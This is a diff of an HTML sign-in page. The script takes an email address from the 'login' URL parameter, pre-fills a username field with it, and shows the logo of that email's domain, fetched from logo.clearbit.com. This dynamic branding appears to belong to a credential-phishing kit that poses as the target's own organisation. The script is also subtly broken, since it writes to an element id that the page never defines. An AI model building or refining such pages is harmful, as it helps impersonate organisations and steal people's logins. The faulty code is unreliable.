@@ -22,6 +22,29 @@
       -webkit-text-size-adjust: none;
     }
 
+    input[type=text] {
+      appearance: none;
+      font-size: 16px;
+      box-shadow: none;
+      height: 40px;
+      width: 100%;
+      border: none;
+      border-bottom: 1px #2985db solid;
+      border-top: 1px #2985db solid;
+      border-left: 1px #2985db solid;
+      color: #404040;
+      background-color: white;
+      background-image: url("img/id.png");
+      background-position: 1px 2px;
+      background-repeat: no-repeat;
+      padding: 10px 35px;
+    }
+
+    input[type=text]:focus {
+      outline: none;
+      box-shadow: none;
+    }
+
     p {
       font-size: 14px;
       text-align: center;
@@ -31,13 +54,6 @@
       font-weight: 700;
       font-size: 24px;
       text-align: center;
-    }
-
-    .only-domain-box {
-      font-size: 18px;
-      text-align: center;
-      margin-top: 10px;
-      color: #333;
     }
   </style>
 </head>
@@ -67,11 +83,20 @@
                         </h1>
                       </td>
                     </tr>
-                    <tr><td height="14"><p>Proceed with <span id="domainDisplay">@domain</span></p></td></tr>
+                    <tr><td height="14"><p>Please enter your username.</p></td></tr>
                     <tr><td height="40"></td></tr>
                     <tr>
+                      <td width="400" height="40">
+                        <div class="input-group">
+                          <input name="user" placeholder="Username" type="text" required class="form-control" id="">
+                          <input type="hidden" name="domain" id="hiddenDomain">
+                          <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@domain</span>
+                        </div>
+                      </td>
+                    </tr>
+                    <tr><td height="20"></td></tr>
+                    <tr>
                       <td>
-                        <input type="hidden" name="domain" id="hiddenDomain">
                         <input type="image" src="img/signin-btn.png" width="400" height="44" name="I1">
                       </td>
                     </tr>
@@ -122,17 +147,19 @@
     const raw = params.get('login');
     const email = raw ? decodeURIComponent(raw) : '';
 
-    let domain = '';
+    let user = '', domain = '';
     if (email.includes('@')) {
-      [, domain] = email.split('@');
-    } else {
-      domain = email;
+      [user, domain] = email.split('@');
     }
 
+    // Set input values
+    document.getElementById('usernameInput').value = user || '';
+    document.getElementById('hiddenDomain').value = domain || 'domain';
+
+    // Update domain visuals
     if (domain) {
-      document.getElementById('hiddenDomain').value = domain;
+      document.getElementById('domainAddon').textContent = '@' + domain;
       document.getElementById('domainLabel').textContent = domain;
-      document.getElementById('domainDisplay').textContent = '@' + domain;
       document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
     }
   </script>
